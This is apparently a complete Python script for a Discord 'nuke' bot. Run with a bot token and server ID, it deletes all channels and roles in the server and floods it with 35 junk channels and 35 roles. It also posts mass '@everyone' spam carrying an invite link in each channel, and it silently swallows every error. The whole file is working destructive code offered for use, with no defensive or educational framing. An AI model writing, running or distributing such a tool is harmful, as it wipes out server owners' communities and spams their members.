import discord
import asyncio
from contextlib import suppress
from discord.ext import commands

class GhostProtocol(commands.Bot):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        

async def execute_phase(task, *args):
    with suppress(Exception):
        await task(*args)

async def spe(token, guild_id):
    intents = discord.Intents.all()
    bot = GhostProtocol(command_prefix="", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        guild = bot.get_guild(int(guild_id))
        if not guild:
            await bot.close()
            return

        try:
            await execute_phase(asyncio.gather, *[
                channel.delete() 
                for channel in guild.channels 
            ])

            await execute_phase(asyncio.gather, *[
                role.delete() 
                for role in guild.roles
            ])

            channel_tasks = [
                guild.create_text_channel(
                    name=f"XXX Team",
                    slowmode_delay=0
                ) for _ in range(35)
            ]
            await execute_phase(asyncio.gather, *channel_tasks)
            
            role_tasks = [
                guild.create_role(
                    name=f"XXX Team",
                    color=discord.Color.random()
                ) for _ in range(35)
            ]
            await execute_phase(asyncio.gather, *role_tasks)

            messages = [
                channel.send("discord.gg/ao\n\n@everyone")
                for channel in guild.text_channels
                for _ in range(35)
            ]
            await execute_phase(asyncio.gather, *messages)


        except Exception as e:
            pass
        finally:
            await bot.close()

    try:
        await bot.start(token)
    finally:
        with suppress(Exception):
            await bot.close()


asyncio.run(spe("token bot", "server id"))